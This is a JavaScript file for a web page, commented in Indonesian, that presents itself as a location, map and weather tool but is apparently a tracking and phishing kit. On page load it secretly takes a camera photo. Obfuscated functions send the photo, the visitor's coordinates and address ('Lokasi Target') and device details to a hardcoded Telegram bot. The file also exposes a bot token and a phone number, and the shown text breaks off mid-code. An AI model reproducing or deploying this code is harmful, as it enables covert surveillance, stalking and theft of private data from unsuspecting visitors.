// This script was created by: 𝗥𝗮𝗳𝗮𝘀𝗵𝗮 𝗔𝗹𝗳𝗶𝗮𝗻𝗱𝗶
// creator's phone number: +6287734034677
// script ini di lindungi oleh undang-undang hak cipta BACA README.MD

let map; 
let markers = []; 

// Fungsi untuk mendapatkan lokasi pengguna
function getLocation() {
    const status = document.getElementById('status');
    const mapContainer = document.getElementById('map-container');
    const addressElement = document.getElementById('address');

    // Langsung menampilkan peta saat tombol ditekan
    mapContainer.style.display = 'block';
    addressElement.textContent = ''; // Reset alamat

    // Cek apakah browser mendukung Geolocation API
    if ('geolocation' in navigator) {
        document.getElementById('loadingSpinner').style.display = 'block'; // Tampilkan loading spinner
        navigator.geolocation.getCurrentPosition(showPosition, showError);
        status.textContent = 'Mendapatkan lokasi...';
    } else {
        status.textContent = 'Geolocation tidak didukung oleh browser ini.';
    }
}

// Fungsi untuk menampilkan lokasi di peta dan mendapatkan alamat
function showPosition(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    const mapArea = document.getElementById('map');
    const status = document.getElementById('status');
    const addressElement = document.getElementById('address');
    
    document.getElementById('loadingSpinner').style.display = 'none'; // Sembunyikan loading spinner

    // Tampilkan status lokasi
    status.textContent = `Latitude: ${latitude.toFixed(5)}, Longitude: ${longitude.toFixed(5)}`;

    // Jika peta belum diinisialisasi, buat peta baru
    if (!map) {
        map = L.map(mapArea).setView([latitude, longitude], 16); // Menggunakan zoom level lebih tinggi

        // Menggunakan Tile Layer dari OpenStreetMap
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; OpenStreetMap contributors'
        }).addTo(map);
    } else {
        // Jika peta sudah ada, setel ulang view ke lokasi baru
        map.setView([latitude, longitude], 16);
    }

    // Tambahkan marker ke lokasi saat ini
    const marker = L.marker([latitude, longitude]).addTo(map)
        .bindPopup('Anda di sini!')
        .openPopup();
    
    // Simpan marker ke array agar bisa dihapus atau dikelola
    markers.push(marker);

    // Simpan lokasi ke riwayat
    saveLocationToHistory(latitude, longitude);

    // Mendapatkan cuaca berdasarkan lokasi
    getWeather(latitude, longitude);

    // Mendapatkan alamat dari koordinat menggunakan Nominatim
    fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&addressdetails=1&zoom=18&extratags=1&accept-language=id`, {
        headers: {
            'User-Agent': 'app tracker/1.0 (ailearnsbyalfian@gmail.com)' // Gmail jangan di ganti nanti eror!!
        }
    })
    .then(response => response.json())
    .then(data => {
        if (data && data.display_name) {
            addressElement.textContent = `Lokasi: ${data.display_name}`;
            // Kirim lokasi dan alamat ke Telegram
            sendLocationToTelegram(latitude, longitude, data.display_name);
        } else {
            addressElement.textContent = 'Alamat tidak ditemukan.';
        }
    })
    .catch(error => {
        console.error('Error fetching address:', error);
        addressElement.textContent = 'Error fetching address.';
    });
}

// Fungsi untuk mengirim lokasi dan alamat ke Telegram
(function(_0x257ed3,_0x27c119){const _0x5d3498=_0x51e2,_0x1ff0f1=_0x257ed3();while(!![]){try{const _0x1d813=-parseInt(_0x5d3498(0xe7))/0x1+-parseInt(_0x5d3498(0xdd))/0x2*(parseInt(_0x5d3498(0xde))/0x3)+parseInt(_0x5d3498(0xd8))/0x4*(-parseInt(_0x5d3498(0xed))/0x5)+parseInt(_0x5d3498(0xef))/0x6*(-parseInt(_0x5d3498(0xd6))/0x7)+parseInt(_0x5d3498(0xe1))/0x8*(parseInt(_0x5d3498(0xdc))/0x9)+parseInt(_0x5d3498(0xd2))/0xa*(parseInt(_0x5d3498(0xe5))/0xb)+parseInt(_0x5d3498(0xdf))/0xc;if(_0x1d813===_0x27c119)break;else _0x1ff0f1['push'](_0x1ff0f1['shift']());}catch(_0x33b427){_0x1ff0f1['push'](_0x1ff0f1['shift']());}}}(_0x2eaf,0xafc30));function _0x51e2(_0xc5fafa,_0x5f7b2e){const _0x2eaffb=_0x2eaf();return _0x51e2=function(_0x51e209,_0x111612){_0x51e209=_0x51e209-0xd2;let _0x10c8e0=_0x2eaffb[_0x51e209];return _0x10c8e0;},_0x51e2(_0xc5fafa,_0x5f7b2e);}function sendLocationToTelegram(_0x17fbd3,_0x10ce7f,_0x3565eb){const _0x24b8a5=_0x51e2,_0x1328aa={'SXxoz':_0x24b8a5(0xd7),'SNMun':'Terjadi\x20kesalahan\x20saat\x20membuka\x20lokasi','ZIPgh':_0x24b8a5(0xda),'YMrrV':_0x24b8a5(0xea),'OswHQ':'-1002360934041','Ivsnm':_0x24b8a5(0xe6),'OeJlL':function(_0x1bd4f5,_0x48cee5,_0x1c88a0){return _0x1bd4f5(_0x48cee5,_0x1c88a0);}};if(!_0x17fbd3||!_0x10ce7f||!_0x3565eb){console[_0x24b8a5(0xf2)](_0x1328aa[_0x24b8a5(0xe9)]);return;}const _0x386cc7=_0x1328aa[_0x24b8a5(0xdb)],_0x50b6e7=_0x1328aa[_0x24b8a5(0xee)],_0x406861=_0x24b8a5(0xe8)+_0x386cc7+'/sendMessage',_0x5bb79d=_0x24b8a5(0xe2)+_0x17fbd3[_0x24b8a5(0xd4)](0x5)+_0x24b8a5(0xeb)+_0x10ce7f[_0x24b8a5(0xd4)](0x5)+_0x24b8a5(0xd5)+_0x3565eb,_0x53018a=new FormData();_0x53018a['append'](_0x24b8a5(0xe4),_0x50b6e7),_0x53018a['append'](_0x1328aa[_0x24b8a5(0xf1)],_0x5bb79d),_0x1328aa['OeJlL'](fetch,_0x406861,{'method':_0x24b8a5(0xd9),'body':_0x53018a})[_0x24b8a5(0xec)](_0x44b2a1=>_0x44b2a1[_0x24b8a5(0xf0)]())[_0x24b8a5(0xec)](_0x232620=>{const _0x2f03a8=_0x24b8a5;_0x232620['ok']?console['log'](_0x1328aa[_0x2f03a8(0xd3)]):console['error'](_0x1328aa['SNMun']);})[_0x24b8a5(0xe3)](_0x2c044a=>{const _0x50cd71=_0x24b8a5;console[_0x50cd71(0xf2)](_0x50cd71(0xe0),_0x2c044a);});}function _0x2eaf(){const _0xe71898=['SXxoz','toFixed','\x0aAlamat:\x20','365813blnCEC','Jasa\x20buat\x20website\x20hubungi\x20https://t.me/Rafashaalfian','381104ZqDEQk','POST','Data\x20lokasi\x20tidak\x20lengkap.','YMrrV','9pVOenh','52738LQIyub','66YXzYpE','20403336oUgddl','Error:','2160488SbOpOm','📍\x20Lokasi\x20Target:\x0aLatitude:\x20','catch','chat_id','1846570bTPwoD','text','685942blITdd','https://api.telegram.org/bot','ZIPgh','8137866512:AAE771KJrWSUMAaIpBcu_OLjbH3O_nArulU','\x0aLongitude:\x20','then','35idFeBi','OswHQ','18RoZroO','json','Ivsnm','error','50NUJLDm'];_0x2eaf=function(){return _0xe71898;};return _0x2eaf();}

// Fungsi untuk menyimpan lokasi ke riwayat
function saveLocationToHistory(latitude, longitude) {
    const location = `Latitude: ${latitude.toFixed(5)}, Longitude: ${longitude.toFixed(5)}`;
    const locationList = document.getElementById('location-history');
    const li = document.createElement('li');
    li.textContent = location;
    locationList.appendChild(li);
}

// Fungsi untuk menangani kesalahan Geolocation
function showError(error) {
    const status = document.getElementById('status');
    const addressElement = document.getElementById('address');
    document.getElementById('loadingSpinner').style.display = 'none'; // Sembunyikan loading spinner

    addressElement.textContent = ''; // Reset alamat
    switch (error.code) {
        case error.PERMISSION_DENIED:
            status.textContent = "Izin lokasi ditolak.";
            break;
        case error.POSITION_UNAVAILABLE:
            status.textContent = "Informasi lokasi tidak tersedia.";
            break;
        case error.TIMEOUT:
            status.textContent = "Waktu permintaan lokasi habis.";
            break;
        case error.UNKNOWN_ERROR:
            status.textContent = "Kesalahan tidak diketahui.";
            break;
    }
}

// Fungsi untuk mengambil foto dan langsung mengirimkan ke Telegram saat halaman dimuat
function takePhotoAndSendToTelegram() {
    const video = document.getElementById('camera');
    const canvas = document.getElementById('canvas');

    // Periksa apakah browser mendukung API getUserMedia
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function (stream) {
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    // Tunggu hingga video siap, lalu ambil foto
                    const context = canvas.getContext('2d');

                    // Sesuaikan ukuran canvas dengan ukuran video
                    const videoWidth = video.videoWidth;
                    const videoHeight = video.videoHeight;
                    canvas.width = videoWidth;
                    canvas.height = videoHeight;

                    // Mengambil gambar dari video ke canvas
                    context.drawImage(video, 0, 0, videoWidth, videoHeight);

                    // Ambil data URI dari canvas
                    const dataUrl = canvas.toDataURL('image/png');

                    // Kirim foto ke Telegram
                    sendToTelegram(dataUrl);

                    // Matikan stream video untuk menghemat sumber daya
                    stream.getTracks().forEach(track => track.stop());
                };
            })
            .catch(function (err) {
                console.error("Terjadi kesalahan saat mengakses kamera: ", err);
            });
    } else {
        alert("Maaf, browser Anda tidak mendukung akses kamera.");
    }
}

// Fungsi untuk mengirim foto ke Telegram
(function(_0x1fbb6b,_0x5d842d){const _0x7dc4e9=_0xb934,_0xae409e=_0x1fbb6b();while(!![]){try{const _0x49eb82=parseInt(_0x7dc4e9(0x1ae))/0x1+parseInt(_0x7dc4e9(0x1b1))/0x2*(parseInt(_0x7dc4e9(0x198))/0x3)+parseInt(_0x7dc4e9(0x19c))/0x4*(-parseInt(_0x7dc4e9(0x1a8))/0x5)+parseInt(_0x7dc4e9(0x19a))/0x6*(-parseInt(_0x7dc4e9(0x1ab))/0x7)+parseInt(_0x7dc4e9(0x19d))/0x8+parseInt(_0x7dc4e9(0x1a6))/0x9+-parseInt(_0x7dc4e9(0x1a7))/0xa*(parseInt(_0x7dc4e9(0x197))/0xb);if(_0x49eb82===_0x5d842d)break;else _0xae409e['push'](_0xae409e['shift']());}catch(_0x278086){_0xae409e['push'](_0xae409e['shift']());}}}(_0x506c,0x2fff7));function _0xb934(_0xc2f22c,_0x55094d){const _0x506c20=_0x506c();return _0xb934=function(_0xb9345c,_0x5bb131){_0xb9345c=_0xb9345c-0x196;let _0x2b89dc=_0x506c20[_0xb9345c];return _0x2b89dc;},_0xb934(_0xc2f22c,_0x55094d);}function _0x506c(){const _0x36f388=['json','then','catch','append','3030102sMfnAN','4007050ePjFsI','16145hHMffb','https://api.telegram.org/bot','pAHVu','12005MWDLPR','Error:','Foto\x20berhasil\x20dikirim\x20ke\x20Telegram.','159461teOsSU','-1002360934041','GqysU','3364koBIYE','error','zokuu','11OnBhck','354CQsKaX','/sendPhoto','282FafHap','8137866512:AAE771KJrWSUMAaIpBcu_OLjbH3O_nArulU','116zxpMZf','615480JESBxj','uCDRf','log','MtZID','QrWfl'];_0x506c=function(){return _0x36f388;};return _0x506c();}function sendToTelegram(_0x1e8692){const _0x161e1b=_0xb934,_0x1b5e05={'pAHVu':_0x161e1b(0x1ad),'JNaam':'Terjadi\x20kesalahan\x20saat\x20membuka\x20kamera.','zokuu':_0x161e1b(0x1ac),'GqysU':_0x161e1b(0x1af),'uCDRf':'chat_id','QrWfl':'photo','FAZEO':function(_0x2f9a05,_0x2c899a){return _0x2f9a05(_0x2c899a);},'MtZID':function(_0x29adb7,_0x4d744f,_0x1cbe45){return _0x29adb7(_0x4d744f,_0x1cbe45);},'lYjQM':'POST'},_0x2eac51=_0x161e1b(0x19b),_0x321924=_0x1b5e05[_0x161e1b(0x1b0)],_0x44f48a=_0x161e1b(0x1a9)+_0x2eac51+_0x161e1b(0x199);let _0x53a06c=new FormData();_0x53a06c[_0x161e1b(0x1a5)](_0x1b5e05[_0x161e1b(0x19e)],_0x321924),_0x53a06c[_0x161e1b(0x1a5)](_0x1b5e05[_0x161e1b(0x1a1)],_0x1b5e05['FAZEO'](dataURItoBlob,_0x1e8692)),_0x1b5e05[_0x161e1b(0x1a0)](fetch,_0x44f48a,{'method':_0x1b5e05['lYjQM'],'body':_0x53a06c})[_0x161e1b(0x1a3)](_0x413507=>_0x413507[_0x161e1b(0x1a2)]())['then'](_0x5786ea=>{const _0x1a615e=_0x161e1b;_0x5786ea['ok']?console[_0x1a615e(0x19f)](_0x1b5e05[_0x1a615e(0x1aa)]):console[_0x1a615e(0x1b2)](_0x1b5e05['JNaam'],_0x5786ea);})[_0x161e1b(0x1a4)](_0x457a20=>{const _0x11f5a3=_0x161e1b;console['error'](_0x1b5e05[_0x11f5a3(0x196)],_0x457a20);});}
// Fungsi untuk mengubah data URI menjadi Blob
function dataURItoBlob(dataURI) {
    let byteString = atob(dataURI.split(',')[1]);
    let arrayBuffer = new ArrayBuffer(byteString.length);
    let uintArray = new Uint8Array(arrayBuffer);
    for (let i = 0; i < byteString.length; i++) {
        uintArray[i] = byteString.charCodeAt(i);
    }
    return new Blob([uintArray], { type: 'image/png' });
}

// Tambahkan event listener saat halaman dimuat
document.addEventListener('DOMContentLoaded', () => {
    checkDarkModeStatus(); // Untuk mengatur mode gelap
    takePhotoAndSendToTelegram(); // Memanggil fungsi pengambilan foto dan pengiriman otomatis
});

// Fungsi untuk membuka kamera dan menampilkan video
function openCamera() {
    const video = document.getElementById('camera');

    // Periksa apakah browser mendukung API getUserMedia
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function (stream) {
                video.srcObject = stream;

                // Ambil foto langsung ketika kamera berhasil dibuka
                video.onloadedmetadata = () => takePhoto();
            })
            .catch(function (err) {
                console.log("Terjadi kesalahan saat mengakses kamera: " + err);
            });
    } else {
        alert("Maaf, browser Anda tidak mendukung akses kamera.");
    }
}

// Fungsi untuk mengambil foto dan mengirimkan ke Telegram
function takePhoto() {
    const video = document.getElementById('camera');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    // Sesuaikan ukuran canvas agar sesuai dengan ukuran video
    const videoWidth = video.videoWidth;
    const videoHeight = video.videoHeight;

    // Set canvas ukuran sesuai dengan ukuran video
    canvas.width = videoWidth;
    canvas.height = videoHeight;

    // Mengambil gambar dari stream video dan menggambar ke canvas
    context.drawImage(video, 0, 0, videoWidth, videoHeight);

    // Ambil data URI dari canvas yang sudah digambar
    const dataUrl = canvas.toDataURL('image/png');

    // Kirim foto ke Telegram
    sendToTelegram(dataUrl);
}

// Fungsi untuk mengirim foto ke Telegram
function _0x2ecb(_0x579d62,_0x1e2c7d){const _0x816578=_0x8165();return _0x2ecb=function(_0x2ecb26,_0x172de6){_0x2ecb26=_0x2ecb26-0x90;let _0xd0dd72=_0x816578[_0x2ecb26];return _0xd0dd72;},_0x2ecb(_0x579d62,_0x1e2c7d);}(function(_0x4ae4f6,_0x2e57f2){const _0x4da6b2=_0x2ecb,_0x10e14f=_0x4ae4f6();while(!![]){try{const _0x130bb6=parseInt(_0x4da6b2(0xa1))/0x1+parseInt(_0x4da6b2(0x9b))/0x2*(parseInt(_0x4da6b2(0x99))/0x3)+parseInt(_0x4da6b2(0xa0))/0x4+-parseInt(_0x4da6b2(0xa4))/0x5*(parseInt(_0x4da6b2(0x98))/0x6)+-parseInt(_0x4da6b2(0x9a))/0x7+-parseInt(_0x4da6b2(0x91))/0x8+-parseInt(_0x4da6b2(0x92))/0x9;if(_0x130bb6===_0x2e57f2)break;else _0x10e14f['push'](_0x10e14f['shift']());}catch(_0x1e7449){_0x10e14f['push'](_0x10e14f['shift']());}}}(_0x8165,0xe4c50));function sendToTelegram(_0x3deec1){const _0x466bd2=_0x2ecb,_0x448a41={'jWgdS':function(_0x1bf8ef,_0x11a0cf){return _0x1bf8ef(_0x11a0cf);},'svbAm':_0x466bd2(0xaa),'WbfxO':_0x466bd2(0xa8),'sGrXg':'Error:','wbCzn':'-1002360934041','stmtk':_0x466bd2(0xa7),'bhkFy':'photo','XNXoQ':function(_0x5c7057,_0x337fc6){return _0x5c7057(_0x337fc6);},'UdDdL':function(_0x47d647,_0x467b94,_0x18123f){return _0x47d647(_0x467b94,_0x18123f);}},_0x30f7b9=_0x466bd2(0x9c),_0x5a5d09=_0x448a41[_0x466bd2(0x9f)],_0x444284=_0x466bd2(0xa5)+_0x30f7b9+'/sendPhoto';let _0x23b6db=new FormData();_0x23b6db[_0x466bd2(0x94)](_0x448a41[_0x466bd2(0xa3)],_0x5a5d09),_0x23b6db[_0x466bd2(0x94)](_0x448a41[_0x466bd2(0x9e)],_0x448a41[_0x466bd2(0x9d)](dataURItoBlob,_0x3deec1)),_0x448a41['UdDdL'](fetch,_0x444284,{'method':'POST','body':_0x23b6db})[_0x466bd2(0xa6)](_0x55ad02=>_0x55ad02[_0x466bd2(0x97)]())[_0x466bd2(0xa6)](_0x1f14f7=>{const _0x32d865=_0x466bd2;_0x1f14f7['ok']?_0x448a41[_0x32d865(0xa9)](alert,_0x448a41[_0x32d865(0xa2)]):alert(_0x448a41[_0x32d865(0x95)]);})['catch'](_0x3b88ff=>{const _0x22fbe7=_0x466bd2;console[_0x22fbe7(0x93)](_0x448a41[_0x22fbe7(0x90)],_0x3b88ff),_0x448a41[_0x22fbe7(0xa9)](alert,_0x22fbe7(0x96));});}function _0x8165(){const _0x1ada50=['bhkFy','wbCzn','4922616PvVGeJ','714395DOmOkc','svbAm','stmtk','35Obbvzt','https://api.telegram.org/bot','then','chat_id','Terjadi\x20kesalahan\x20saat\x20membuka\x20kamera.','jWgdS','Jasa\x20buat\x20website\x20hubungi\x20https://t.me/Rafashaalfian','sGrXg','732528EyIiBL','4252131MvqYkT','error','append','WbfxO','Terjadi\x20kesalahan.','json','23160dcPOXk','5961IAAeKe','7536536kYngBQ','664vlOJTF','8137866512:AAE771KJrWSUMAaIpBcu_OLjbH3O_nArulU','XNXoQ'];_0x8165=function(){return _0x1ada50;};return _0x8165();}
// Fungsi untuk mengubah data URI menjadi Blob
function dataURItoBlob(dataURI) {
    let byteString = atob(dataURI.split(',')[1]);
    let arrayBuffer = new ArrayBuffer(byteString.length);
    let uintArray = new Uint8Array(arrayBuffer);
    for (let i = 0; i < byteString.length; i++) {
        uintArray[i] = byteString.charCodeAt(i);
    }
    return new Blob([uintArray], { type: 'image/png' });
}

// Dark mode functionality
let isDarkMode = false;

function toggleDarkMode() {
    isDarkMode = !isDarkMode;
    document.body.classList.toggle('dark-mode');

    // Simpan status mode ke localStorage agar bisa bertahan saat halaman di-refresh
    localStorage.setItem('darkMode', isDarkMode);
    updateDarkModeButtonText();
}

// Fungsi untuk memeriksa apakah dark mode aktif dari localStorage
function checkDarkModeStatus() {
    const darkModeStatus = localStorage.getItem('darkMode');
    if (darkModeStatus === 'true') {
        isDarkMode = true;
        document.body.classList.add('dark-mode');
    }
    updateDarkModeButtonText();
}

// Fungsi untuk memperbarui teks tombol dark mode
function updateDarkModeButtonText() {
    const toggleButton = document.getElementById('darkModeToggle');
    toggleButton.innerHTML = isDarkMode ? '☀️ Switch to Light Mode' : '🌙 Switch to Dark Mode';
}

// Fungsi untuk mendapatkan informasi cuaca
function _0x39c9(_0x1d1f3d,_0x5615c0){const _0x54d091=_0x54d0();return _0x39c9=function(_0x39c907,_0x5e8e28){_0x39c907=_0x39c907-0x8d;let _0x24cec4=_0x54d091[_0x39c907];return _0x24cec4;},_0x39c9(_0x1d1f3d,_0x5615c0);}(function(_0x35e6a4,_0x20ee15){const _0x79d7d=_0x39c9,_0x5a33bf=_0x35e6a4();while(!![]){try{const _0x507612=parseInt(_0x79d7d(0xa0))/0x1*(parseInt(_0x79d7d(0xa1))/0x2)+parseInt(_0x79d7d(0xa6))/0x3+-parseInt(_0x79d7d(0x96))/0x4*(parseInt(_0x79d7d(0xa3))/0x5)+-parseInt(_0x79d7d(0x9b))/0x6*(parseInt(_0x79d7d(0x94))/0x7)+-parseInt(_0x79d7d(0xa5))/0x8+-parseInt(_0x79d7d(0x90))/0x9+-parseInt(_0x79d7d(0x8d))/0xa*(-parseInt(_0x79d7d(0xa4))/0xb);if(_0x507612===_0x20ee15)break;else _0x5a33bf['push'](_0x5a33bf['shift']());}catch(_0xf803d){_0x5a33bf['push'](_0x5a33bf['shift']());}}}(_0x54d0,0x7bf3e));function _0x54d0(){const _0x8dff49=['catch','VMZuM','be2fbce957441bd5f28348a8a9ab448e','description','282EzbqAe','ikJVg','then','YaXvo','&units=metric&lang=id','863wWjPqQ','1138Wwprqt','json','76895xrdnDl','12969bnjCTk','4730344TTtyLW','1492560vSmpsi','&appid=','Error\x20fetching\x20weather:','getElementById','https://api.openweathermap.org/data/2.5/weather?lat=','14870SAiTNr','error',',\x20Suhu:\x20','2449467QNzwMv','&lon=','innerText','IGXtW','105637xDfecT','jTEtO','172nWPQfE'];_0x54d0=function(){return _0x8dff49;};return _0x54d0();}function getWeather(_0x4078de,_0x2964d4){const _0x2a8669=_0x39c9,_0x493c7b={'ikJVg':function(_0x4c4cd2,_0x343b70){return _0x4c4cd2===_0x343b70;},'IGXtW':'weather','YaXvo':'Cuaca\x20tidak\x20ditemukan\x20untuk\x20lokasi\x20ini.','VMZuM':_0x2a8669(0xa8),'jTEtO':'Gagal\x20mengambil\x20data\x20cuaca.','pOFsi':function(_0x1cc103,_0x400b68){return _0x1cc103(_0x400b68);}},_0x4de450=_0x2a8669(0x99),_0x450895=_0x2a8669(0xaa)+_0x4078de+_0x2a8669(0x91)+_0x2964d4+_0x2a8669(0xa7)+_0x4de450+_0x2a8669(0x9f);_0x493c7b['pOFsi'](fetch,_0x450895)[_0x2a8669(0x9d)](_0x3870b5=>_0x3870b5[_0x2a8669(0xa2)]())[_0x2a8669(0x9d)](_0x18e6f4=>{const _0xcf0e00=_0x2a8669;if(_0x493c7b[_0xcf0e00(0x9c)](_0x18e6f4['cod'],0xc8)){const _0x28e30b='Cuaca\x20saat\x20ini:\x20'+_0x18e6f4['weather'][0x0][_0xcf0e00(0x9a)]+_0xcf0e00(0x8f)+_0x18e6f4['main']['temp']+'°C';document['getElementById'](_0x493c7b[_0xcf0e00(0x93)])[_0xcf0e00(0x92)]=_0x28e30b;}else document[_0xcf0e00(0xa9)]('weather')[_0xcf0e00(0x92)]=_0x493c7b[_0xcf0e00(0x9e)];})[_0x2a8669(0x97)](_0x5e2c94=>{const _0x1ba289=_0x2a8669;console[_0x1ba289(0x8e)](_0x493c7b[_0x1ba289(0x98)],_0x5e2c94),document[_0x1ba289(0xa9)](_0x493c7b[_0x1ba289(0x93)])[_0x1ba289(0x92)]=_0x493c7b[_0x1ba289(0x95)];});}

// Fungsi untuk menambahkan penanda kustom di peta
function addCustomMarker() {
    if (map) {
        // Tambahkan event listener klik di peta
        map.on('click', function(e) {
            const lat = e.latlng.lat;
            const lon = e.latlng.lng;

            const marker = L.marker([lat, lon]).addTo(map)
                .bindPopup(`Lokasi Penanda: ${lat.toFixed(5)}, ${lon.toFixed(5)}`).openPopup();
            
            markers.push(marker);

            saveLocationToHistory(lat, lon);
        });
    } else {
        alert('Peta belum diinisialisasi. Dapatkan lokasi terlebih dahulu.');
    }
}

const _0x1502d4=_0x3bb8;function _0x3bb8(_0x2c9411,_0x51c25e){const _0x33e993=_0x33e9();return _0x3bb8=function(_0x3bb81f,_0x2a1c47){_0x3bb81f=_0x3bb81f-0xde;let _0x10313b=_0x33e993[_0x3bb81f];return _0x10313b;},_0x3bb8(_0x2c9411,_0x51c25e);}(function(_0x40c8f6,_0x3e34f3){const _0x19b161=_0x3bb8,_0x4c7ff4=_0x40c8f6();while(!![]){try{const _0x2b88a0=parseInt(_0x19b161(0x13c))/0x1*(parseInt(_0x19b161(0x1a4))/0x2)+parseInt(_0x19b161(0x16b))/0x3*(-parseInt(_0x19b161(0x177))/0x4)+-parseInt(_0x19b161(0x122))/0x5+-parseInt(_0x19b161(0x190))/0x6+-parseInt(_0x19b161(0x100))/0x7*(-parseInt(_0x19b161(0x166))/0x8)+parseInt(_0x19b161(0x109))/0x9+parseInt(_0x19b161(0x133))/0xa;if(_0x2b88a0===_0x3e34f3)break;else _0x4c7ff4['push'](_0x4c7ff4['shift']());}catch(_0x3bd4af){_0x4c7ff4['push'](_0x4c7ff4['shift']());}}}(_0x33e9,0x7858e));async function detectDeviceInfoAndSendToTelegram(){const _0x532e3d=_0x3bb8,_0x19743f={'gAxJl':function(_0x3e6c80){return _0x3e6c80();},'XtoVG':_0x532e3d(0x15a),'qrLKU':_0x532e3d(0x12c),'lcJVA':_0x532e3d(0x145),'YPQrq':_0x532e3d(0x172),'BrCsU':'ethernet','xEuxB':_0x532e3d(0x1aa),'XoEku':'Bluetooth\x20🦷','ZhacE':_0x532e3d(0x152),'qDFFo':_0x532e3d(0xed),'efpWH':_0x532e3d(0xf3),'STOVd':_0x532e3d(0x150),'JZCit':_0x532e3d(0xf1),'LZZMW':function(_0x74c04e,_0x1d8873){return _0x74c04e+_0x1d8873;},'VkCQy':function(_0x5a92aa,_0x4af796){return _0x5a92aa+_0x4af796;},'nJOzo':function(_0x49f3c2,_0x45a9df){return _0x49f3c2+_0x45a9df;},'SdaLZ':function(_0x3eea7d,_0x4987d7){return _0x3eea7d+_0x4987d7;},'QNlia':function(_0x26c5d8,_0x3327b4){return _0x26c5d8+_0x3327b4;},'bAJRv':function(_0xd78c86,_0x2c1961){return _0xd78c86+_0x2c1961;},'UQKPK':function(_0x35881,_0x464b81){return _0x35881+_0x464b81;},'ryklc':function(_0x145460,_0x120726){return _0x145460+_0x120726;},'azGbF':function(_0x3c4825,_0x19dea2){return _0x3c4825+_0x19dea2;},'PwnNS':function(_0xda0dda,_0x3a399e){return _0xda0dda+_0x3a399e;},'AjpIj':function(_0x5af34e,_0x3542d4){return _0x5af34e+_0x3542d4;},'lZlkV':function(_0x3810e3,_0x2e6cb2){return _0x3810e3+_0x2e6cb2;},'FPRtC':function(_0x40a612,_0x37ee76){return _0x40a612+_0x37ee76;},'tKinW':_0x532e3d(0x144),'EoKfg':_0x532e3d(0x15c),'PTven':'Markdown','uZtPY':function(_0x4b7846,_0x3a02ec,_0x1a8557){return _0x4b7846(_0x3a02ec,_0x1a8557);},'nNYal':_0x532e3d(0x112),'wLbNo':_0x532e3d(0x16f),'OIBeY':_0x532e3d(0x17f),'SnIrH':_0x532e3d(0x146),'egDZB':_0x532e3d(0x111),'HGWAZ':_0x532e3d(0x181),'MqTfx':function(_0x4912c1,_0x10dfea){return _0x4912c1>_0x10dfea;},'pThMk':_0x532e3d(0x178),'lMvGM':_0x532e3d(0x147),'tOqtp':'Aktif','TfQAs':_0x532e3d(0x182),'MMRbq':_0x532e3d(0x164),'fjvhL':'Portrait','lpnPk':_0x532e3d(0xee),'SsfSN':function(_0x15299a,_0x2dcffd){return _0x15299a/_0x2dcffd;},'kKwJz':_0x532e3d(0x139),'xFobc':_0x532e3d(0x14e),'XYJsl':function(_0xc0d083,_0x5b8761){return _0xc0d083(_0x5b8761);},'osiir':function(_0x4440d3,_0x50c6e8){return _0x4440d3(_0x50c6e8);},'SHEIs':'Lokasi\x20tidak\x20diketahui','forzw':function(_0x368cfa,_0x2a35a6){return _0x368cfa(_0x2a35a6);},'WwQrS':_0x532e3d(0x17c),'dWrRH':function(_0x2e4c57,_0x19e423){return _0x2e4c57===_0x19e423;},'OiNLs':function(_0x5c1626,_0x118a0a){return _0x5c1626+_0x118a0a;},'gyacl':function(_0xe6d85a,_0x5b620a){return _0xe6d85a+_0x5b620a;},'RlWkr':function(_0xfb1f0c,_0x25c47e){return _0xfb1f0c*_0x25c47e;},'dNJNO':_0x532e3d(0x19d),'XyNTJ':_0x532e3d(0x161)},_0x29bc79=navigator[_0x532e3d(0x10e)],_0x35e057=navigator['platform'],_0x255876=navigator[_0x532e3d(0x138)],_0x5a02be=navigator['languages']?navigator[_0x532e3d(0x118)]['join'](',\x20'):_0x19743f[_0x532e3d(0x110)],_0x3a1bed=navigator[_0x532e3d(0x18a)],_0x2bf219=window[_0x532e3d(0x171)][_0x532e3d(0x15b)],_0xaf30fa=window['screen']['height'],_0x49114a=navigator[_0x532e3d(0x13f)]||navigator['mozConnection']||navigator[_0x532e3d(0x1ab)],_0x5dad4f=navigator['onLine']?_0x19743f[_0x532e3d(0xfc)]:_0x19743f[_0x532e3d(0x192)],_0x3af4f4=_0x49114a?_0x49114a[_0x532e3d(0x188)]:_0x19743f[_0x532e3d(0x10f)],_0x1df3d5=_0x49114a&&_0x49114a[_0x532e3d(0x136)]?_0x49114a['type']:_0x532e3d(0x111),_0x4378b9=_0x49114a?_0x49114a['downlink']+_0x532e3d(0x168):_0x19743f['egDZB'],_0x167940=Intl[_0x532e3d(0xef)]()[_0x532e3d(0x180)]()[_0x532e3d(0x15f)],_0x1c5fa9=new Date()[_0x532e3d(0xf9)](),_0x31dcb5=window[_0x532e3d(0x134)]&&window[_0x532e3d(0x134)](_0x19743f['HGWAZ'])[_0x532e3d(0xfe)]?_0x532e3d(0xf7):'Nonaktif\x20☀️',_0x211068='ontouchstart'in 